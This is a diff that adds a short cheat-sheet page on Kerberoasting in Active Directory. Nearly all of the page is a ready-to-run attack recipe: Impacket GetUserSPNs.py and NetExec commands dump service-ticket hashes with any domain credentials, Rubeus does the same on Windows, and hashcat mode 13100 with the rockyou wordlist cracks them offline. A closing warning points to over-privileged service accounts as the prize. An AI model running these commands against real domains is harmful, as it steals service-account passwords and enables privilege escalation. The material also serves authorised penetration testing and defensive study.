@@ -1,0 +1,26 @@
+---
+title: "Kerberoasting"
+---
+
+Any authenticated user can request a service ticket (TGS) for an account with an SPN. The ticket is encrypted with the service account's password hash — request it, crack it offline.
+
+```bash
+# Linux (Impacket) — needs any valid domain creds
+GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request -outputfile kerb.hash
+# NetExec
+nxc ldap $DC -u USER -p PASS --kerberoasting kerb.hash
+```
+
+```powershell
+# Windows (Rubeus)
+Rubeus.exe kerberoast /outfile:kerb.hash
+```
+
+```bash
+# crack
+hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
+```
+
+<Warning>
+Service accounts are often over-privileged and set with weak, non-expiring passwords — a Kerberoast frequently yields a high-value account directly.
+</Warning>
